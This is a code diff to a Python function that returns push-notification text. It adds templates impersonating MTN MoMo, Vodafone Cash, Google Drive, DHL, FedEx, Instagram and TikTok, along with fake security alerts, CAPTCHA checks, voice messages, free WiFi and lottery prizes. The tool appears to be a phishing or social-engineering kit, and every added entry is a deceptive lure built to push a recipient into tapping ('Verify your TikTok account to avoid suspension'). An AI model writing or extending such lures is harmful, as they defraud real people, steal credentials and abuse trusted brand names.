@@ -426,6 +426,7 @@ def csv_save(tid, entry):
 # ═══════════════════════════════════════════
 def get_push_message(template):
     messages = {
+        # Ghana-specific
         'momo':         [{'title': '💰 MoMo Alert', 'body': 'You have a pending transfer of GH₵ 500.'}],
         'voda':         [{'title': '📱 Vodafone Cash', 'body': 'Confirm your withdrawal of GH₵ 200.'}],
         'ecg':          [{'title': '⚡ ECG Notice', 'body': 'Your prepaid meter needs attention.'}],
@@ -441,6 +442,39 @@ def get_push_message(template):
         'barber':       [{'title': '💈 VIP Update', 'body': 'VIP client moved to 3PM.'}],
         'cleaner':      [{'title': '🧹 Premium Job', 'body': 'Deep clean — GH₵ 400 payout.'}],
         'influencer':   [{'title': '📱 Brand Approved', 'body': 'Kasapreko approved your concept.'}],
+        # Global — Captcha / Verification
+        'captcha':      [{'title': '🔒 Security Check', 'body': 'Complete verification to continue.'}],
+        'verify':       [{'title': '✓ Verification Needed', 'body': 'One more step to verify your identity.'}],
+        # Global — Google Drive
+        'gdrive':       [{'title': '📄 Document Shared', 'body': 'Someone shared a file with you. Tap to view.'}],
+        'drive':        [{'title': '📄 New Shared File', 'body': 'You have a new document waiting.'}],
+        'document':     [{'title': '📋 Document Access', 'body': 'A document requires your attention.'}],
+        # Global — Security Alerts
+        'security':     [{'title': '⚠️ Security Alert', 'body': 'Unauthorized login attempt detected.'}],
+        'alert':        [{'title': '🚨 Account Alert', 'body': 'Suspicious activity on your account.'}],
+        'login':        [{'title': '⚠️ Login Attempt', 'body': 'Someone tried to access your account.'}],
+        # Global — Package Delivery
+        'package':      [{'title': '📦 Delivery Failed', 'body': 'Your package could not be delivered. Action required.'}],
+        'delivery':     [{'title': '📦 Package Update', 'body': 'Delivery attempt failed. Confirm address.'}],
+        'dhl':          [{'title': '📦 DHL Express', 'body': 'Delivery failed — confirm your address.'}],
+        'fedex':        [{'title': '📦 FedEx Delivery', 'body': 'Package held — address confirmation needed.'}],
+        # Global — Voice Note
+        'voicenote':    [{'title': '🎤 Voice Message', 'body': 'You have an unheard voice message.'}],
+        'voice':        [{'title': '🔊 New Voice Note', 'body': 'Someone sent you a voice message.'}],
+        'audio':        [{'title': '🎤 Audio Message', 'body': 'Tap to listen to your voice message.'}],
+        # Global — WiFi
+        'wifi':         [{'title': '📶 WiFi Available', 'body': 'Free high-speed WiFi detected nearby.'}],
+        'hotspot':      [{'title': '📶 Connect to WiFi', 'body': 'Tap to connect to free WiFi.'}],
+        # Global — Social Media
+        'instagram':    [{'title': '📷 Instagram Security', 'body': 'Your account requires verification.'}],
+        'ig':           [{'title': '📷 Account at Risk', 'body': 'Verify your Instagram account now.'}],
+        'tiktok':       [{'title': '🎵 TikTok Security', 'body': 'Your account is under review.'}],
+        'tt':           [{'title': '🎵 Action Required', 'body': 'Verify your TikTok account to avoid suspension.'}],
+        # Global — Lottery
+        'lottery':      [{'title': '🎉 You Won!', 'body': 'Congratulations! Claim your prize now.'}],
+        'prize':        [{'title': '🎁 Prize Ready', 'body': 'Your prize is waiting. Claim before it expires.'}],
+        'giveaway':     [{'title': '🎁 Giveaway Winner', 'body': 'You have been selected! Claim your reward.'}],
+        'win':          [{'title': '🏆 Winner!', 'body': 'You won! Tap to claim your reward.'}],
     }
     msgs = messages.get(template, [{'title': '🔔 Action Required', 'body': 'You have a pending item.'}])
     return random.choice(msgs)
